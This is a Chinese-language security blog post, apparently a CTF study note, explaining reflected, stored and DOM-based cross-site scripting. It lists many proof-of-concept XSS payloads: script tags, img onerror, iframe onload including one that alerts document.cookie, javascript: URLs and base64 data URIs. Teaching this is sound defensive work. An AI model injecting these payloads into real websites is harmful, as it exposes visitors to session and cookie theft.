@@ -1,0 +1,1279 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>XSS - Wells's Blog</title>
+
+  
+    <meta name="description" content="XSS简介动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS">
+<meta property="og:url" content="https://wells.host/posts/fe1aa8c3/">
+<meta property="og:site_name" content="Wells&#39;s Blog">
+<meta property="og:description" content="XSS简介动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wells.host/img/avatar.jpg">
+<meta property="article:published_time" content="2024-02-18T12:27:38.000Z">
+<meta property="article:modified_time" content="2025-08-05T09:16:33.185Z">
+<meta property="article:author" content="Wells">
+<meta property="article:tag" content="CTF-Web">
+<meta property="article:tag" content="Web-XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wells.host/img/avatar.jpg">
+  
+  
+  
+  <meta name="keywords" content="CTF-Web,Web-XSS">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Wells's Blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/img/favicon.ico">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Wells","sameAs":[],"image":"/img/avatar.jpg"},"dateCreated":"2024-02-18T20:27:38+08:00","dateModified":"2025-08-05T17:16:33+08:00","datePublished":"2024-02-18T20:27:38+08:00","description":"","headline":"XSS","mainEntityOfPage":{"@type":"WebPage","@id":"https://wells.host/posts/fe1aa8c3/"},"publisher":{"@type":"Organization","name":"Wells","sameAs":[],"image":"/img/avatar.jpg","logo":{"@type":"ImageObject","url":"/img/avatar.jpg"}},"url":"https://wells.host/posts/fe1aa8c3/","keywords":"CTF-Web, Web-XSS","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Wells's Blog</div><div class="sub cap">Learning Cyber Security...</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 20.536C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535" opacity="0.5"/><path fill="currentColor" d="M9.5 8.75A3.25 3.25 0 1 0 12.75 12a.75.75 0 0 1 1.5 0A4.75 4.75 0 1 1 9.5 7.25a.75.75 0 0 1 0 1.5"/><path fill="currentColor" d="M17.75 12a3.25 3.25 0 0 1-3.25 3.25a.75.75 0 0 0 0 1.5A4.75 4.75 0 1 0 9.75 12a.75.75 0 0 0 1.5 0a3.25 3.25 0 0 1 6.5 0"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper markdown"><div class="widget-header dis-select"><span class="name">无限进步<<<</span></div><div class="widget-body fs14"><p>少年应有鸿鹄志，当骑骏马踏平川</p>
+</div></widget>
+
+<widget class="widget-wrapper linklist"><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="Web安全" href="/categories/web"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M3.378 5.082C3 5.62 3 7.22 3 10.417v1.574c0 5.638 4.239 8.375 6.899 9.536c.721.315 1.082.473 2.101.473c1.02 0 1.38-.158 2.101-.473C16.761 20.365 21 17.63 21 11.991v-1.574c0-3.198 0-4.797-.378-5.335c-.377-.537-1.88-1.052-4.887-2.081l-.573-.196C13.595 2.268 12.812 2 12 2s-1.595.268-3.162.805L8.265 3c-3.007 1.03-4.51 1.545-4.887 2.082" opacity="0.5"/><path fill="currentColor" fill-rule="evenodd" d="M6.688 9.8a5.75 5.75 0 1 0 10.625 4.4A5.75 5.75 0 0 0 6.688 9.8m5.256-2.032A.1.1 0 0 1 12 7.75c.004 0 .021 0 .056.018a.7.7 0 0 1 .17.134c.153.158.328.431.492.841c.162.404.296.901.39 1.466q.083.502.118 1.041h-2.452q.035-.539.118-1.04a7 7 0 0 1 .39-1.467c.164-.41.34-.683.492-.841a.7.7 0 0 1 .17-.134M9.412 9.964c-.068.415-.116.847-.14 1.286H7.816a4.25 4.25 0 0 1 2.01-2.903a9 9 0 0 0-.415 1.617M7.817 12.75H9.27c.025.439.073.871.141 1.286a9 9 0 0 0 .415 1.617a4.25 4.25 0 0 1-2.01-2.903m8.366-1.5a4.25 4.25 0 0 0-2.01-2.903c.18.486.318 1.034.415 1.617c.068.415.116.847.14 1.286zm-1.454 1.5h1.454a4.25 4.25 0 0 1-2.01 2.903c.18-.486.318-1.034.415-1.617c.068-.415.116-.847.14-1.286m-1.503 0a11 11 0 0 1-.118 1.04a7 7 0 0 1-.39 1.467c-.164.41-.34.683-.492.841a.7.7 0 0 1-.17.134a.1.1 0 0 1-.056.018c-.004 0-.021 0-.056-.018a.7.7 0 0 1-.17-.134c-.153-.158-.328-.431-.492-.841a7 7 0 0 1-.39-1.466a11 11 0 0 1-.118-1.041z" clip-rule="evenodd"/></svg><span>Web安全</span></div></a>
+<a class="link" title="渗透测试" href="/categories/penetration"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none"><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M14 21.71A7 7 0 0 1 5 15v-3.062A3.94 3.94 0 0 1 8.938 8h6.124A3.94 3.94 0 0 1 19 11.938V15a6.98 6.98 0 0 1-2 4.899"/><path fill="currentColor" d="M8.25 7.5a.75.75 0 0 0-1.5 0zm-.615-2.917a.75.75 0 1 0 1.246.834zM17.25 8.5v-1h-1.5v1zm-10.5-1v1h1.5v-1zm10.5 0c0-2.9-2.35-5.25-5.25-5.25v1.5a3.75 3.75 0 0 1 3.75 3.75zM12 2.25a5.25 5.25 0 0 0-4.365 2.333l1.246.834A3.75 3.75 0 0 1 12 3.75z"/><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M19 14h3M5 14H2M14.5 3.5L17 2M9.5 3.5L7 2m13.5 18l-2-.8m2-11.2l-2 .8M3.5 20l2-.8M3.5 8l2 .8M12 21.5V15"/></g></svg><span>渗透测试</span></div></a>
+<a class="link" title="代码审计" href="/categories/code-audit"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path d="m17 7.83l1.697 1.526c1.542 1.389 2.313 2.083 2.313 2.974c0 .89-.771 1.585-2.314 2.973L17 16.83"/><path d="m13.987 5l-3.974 14.83" opacity="0.5"/><path d="M7 7.83L5.304 9.356C3.76 10.745 2.99 11.44 2.99 12.33s.771 1.585 2.314 2.973L7 16.83"/></g></svg><span>代码审计</span></div></a>
+<a class="link" title="电子取证" href="/categories/forensics"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M10 20h3.627a5.25 5.25 0 1 1 8.369-6.34Q22 12.9 22 12c0-.442 0-1.608-.002-2H2.002C2 10.392 2 11.558 2 12c0 3.771 0 5.657 1.172 6.828S6.229 20 10 20" opacity="0.5"/><path fill="currentColor" d="M5.25 16a.75.75 0 0 1 .75-.75h4a.75.75 0 0 1 0 1.5H6a.75.75 0 0 1-.75-.75"/><path fill="currentColor" fill-rule="evenodd" d="M17.75 14.5a2.25 2.25 0 1 0 0 4.5a2.25 2.25 0 0 0 0-4.5M14 16.75a3.75 3.75 0 1 1 6.879 2.068l.901.902a.75.75 0 1 1-1.06 1.06l-.902-.901A3.75 3.75 0 0 1 14 16.75" clip-rule="evenodd"/><path fill="currentColor" d="M9.995 4h4.01c3.781 0 5.672 0 6.846 1.116c.846.803 1.083 1.96 1.149 3.884v1H2V9c.066-1.925.303-3.08 1.149-3.884C4.323 4 6.214 4 9.995 4"/></svg><span>电子取证</span></div></a>
+<a class="link" title="工具手册" href="/categories/tools"><div class="flex"><?xml version="1.0" encoding="UTF-8"?><svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M44 16C44 22.6274 38.6274 28 32 28C29.9733 28 28.0639 27.4975 26.3896 26.6104L9 44L4 39L21.3896 21.6104C20.5025 19.9361 20 18.0267 20 16C20 9.37258 25.3726 4 32 4C34.0267 4 35.9361 4.50245 37.6104 5.38959L30 13L35 18L42.6104 10.3896C43.4975 12.0639 44 13.9733 44 16Z" fill="none" stroke="#333" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>工具手册</span></div></a></div></div></widget>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/posts/5ae37a88/"><span class="title">数据库提权中的字符集挑战</span></a><a class="item title" href="/posts/72baa392/"><span class="title">Yakit插件开发</span></a><a class="item title" href="/posts/b1f1aefc/"><span class="title">常见协议与PHP伪协议</span></a><a class="item title" href="/posts/e85eefb/"><span class="title">SQL Server下SQL注入的应用</span></a><a class="item title" href="/posts/e73517db/"><span class="title">SQL注入</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/we11s" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" href="/about/#comments" rel="noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/942ebbf1a4b91.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web/">web</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-02-18T12:27:38.000Z">2024-02-18</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-08-05T09:16:33.185Z">2025-08-05</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>XSS</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p>
+<h2 id="XSS的分类："><a href="#XSS的分类：" class="headerlink" title="XSS的分类："></a>XSS的分类：</h2><h3 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h3><p>​	(1)<strong>原理</strong></p>
+<p>​	反射型xss又称非持久型xss。发出请求时，此类XSS代码出现在URL中，作为输入提交到服务器端，XSS代码被服务器端解析后传回给浏览器，后解析执行XSS代码。</p>
+<p>​	(2)<strong>攻击方式</strong></p>
+<p>​	攻击者将包含xss代码的恶意链接发送给目标用户。当其他用户访问该链接时，服务器接受该用户的URL中参数的请求并进行处理，后xss代码被服务器发送给其他用户的浏览器，触发xss漏洞</p>
+<h3 id="2、存储型-持久化"><a href="#2、存储型-持久化" class="headerlink" title="2、存储型(持久化)"></a>2、存储型(持久化)</h3><p>​	(1)<strong>原理</strong></p>
+<p>​	存储型XSS，提交的代码会存储在服务器端，其他用户请求该页面时会触发xss漏洞，无需访问攻击者的特定链接。例如：留言板中的XSS，用户提交一条包含XSS代码的留言存储到数据库，其他用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击</p>
+<p>​	(2)<strong>攻击方式</strong></p>
+<p>​	攻击者将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，页面进行解析后响应，最后浏览器解析执行XSS代码，触发xss漏洞</p>
+<h3 id="3、DOM-based型"><a href="#3、DOM-based型" class="headerlink" title="3、DOM-based型"></a>3、DOM-based型</h3><blockquote>
+<p>文档对象模型（DOM）是一个网络文档的编程接口。它代表页面，以便程序可以改变文档的结构、风格和内容。DOM 将文档表示为节点和对象；这样，编程语言就可以与页面交互。</p>
+</blockquote>
+<p>​	(1)<strong>原理</strong></p>
+<p>​	DOM型xss其实是一种特殊类型的反射型xss，与反射型类似此类XSS代码出现在URL中，但DOM XSS和反射型XSS的区别在于DOM XSS代码并不需要服务器参与，依靠客户端进行解析。</p>
+<p>​	(2)<strong>攻击方式</strong></p>
+<p>​	与反射型类似，当其他用户访问该链接时，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p>
+<h2 id="XSS代码插入位置"><a href="#XSS代码插入位置" class="headerlink" title="XSS代码插入位置"></a>XSS代码插入位置</h2><h3 id="1-插入到HTML注释内容中"><a href="#1-插入到HTML注释内容中" class="headerlink" title="1.插入到HTML注释内容中"></a>1.插入到HTML注释内容中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">&lt;script&gt;  alert(&#x27;XSS&#x27;);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-插入到HTML标签的属性值中"><a href="#2-插入到HTML标签的属性值中" class="headerlink" title="2.插入到HTML标签的属性值中"></a>2.插入到HTML标签的属性值中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image,png&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注：<code>onerror</code>属性是HTML中<code>&lt;img&gt;</code>标签的一个事件属性，它用于定义当图像加载失败时执行的JavaScript代码。</p>
+<h3 id="3-插入到HTML标签的属性名中"><a href="#3-插入到HTML标签的属性名中" class="headerlink" title="3.插入到HTML标签的属性名中"></a>3.插入到HTML标签的属性名中</h3><p>使用语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造闭合，可得到以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用构造闭合的方式将恶意代码插入到某个标签中，将恶意代码插入到了标签中的属性值中，实现XSS攻击</p>
+<h3 id="4-插入到HTML标签名中"><a href="#4-插入到HTML标签名中" class="headerlink" title="4.插入到HTML标签名中"></a>4.插入到HTML标签名中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>img src=&quot;/1.png&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>浏览器会将第一个尖括号视为整体标签名的起始符号，而第二个尖括号则是<code>&lt;script&gt;</code> 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现XSS攻击</p>
+<h3 id="6-插入到CSS中"><a href="#6-插入到CSS中" class="headerlink" title="6.插入到CSS中"></a>6.插入到CSS中</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`1`)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们在background-image样式属性中插入了一段JavaScript url（<em>在过去，一些浏览器可能没有严格限制这种用法，允许<code>javascript:</code>伪协议在CSS属性中执行JavaScript代码。</em>），当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码。</p>
+<h3 id="7-插入到HTTP响应中"><a href="#7-插入到HTTP响应中" class="headerlink" title="7.插入到HTTP响应中"></a>7.插入到HTTP响应中</h3><p><strong>先留一个坑，还没看懂这个部分，后面再来填</strong></p>
+<h2 id="运行脚本的标签以及对应属性"><a href="#运行脚本的标签以及对应属性" class="headerlink" title="运行脚本的标签以及对应属性"></a>运行脚本的标签以及对应属性</h2><p><strong><code>&lt;a&gt;</code> 标签</strong></p>
+<p><strong>对应属性：</strong></p>
+<p><code>href</code>属性（手动点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onclick</code>（点击时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签"><a href="#标签" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;</code>标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onerror</code>（加载错误时触发XSS、将src乱输入一个值即可）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;v</span><br></pre></td></tr></table></figure>
+
+<p><code>onclick</code>（点击时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-1"><a href="#标签-1" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;</code>标签</h3><p>HTML 内联框架元素 (<code>&lt;iframe&gt;</code>)</p>
+<p><strong>对应属性：</strong></p>
+<p><code>onload</code>（加载完成时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>src</code>属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; </span><br><span class="line">//base64解码后为&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
